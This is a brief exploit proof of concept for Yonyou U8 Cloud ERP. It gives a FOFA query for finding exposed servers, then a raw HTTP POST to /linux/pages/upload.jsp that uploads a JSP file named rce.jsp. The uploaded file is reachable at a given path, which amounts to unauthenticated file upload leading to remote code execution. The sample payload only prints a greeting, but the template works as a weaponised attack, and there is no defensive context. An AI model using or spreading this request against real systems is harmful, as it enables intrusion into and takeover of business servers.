FOFA：app="用友-U8-Cloud"

```
POST /linux/pages/upload.jsp HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
filename: rce.jsp
 
<% out.println("Hello,U8C");%>
```

http://your-ip/linux/上传文件名.jsp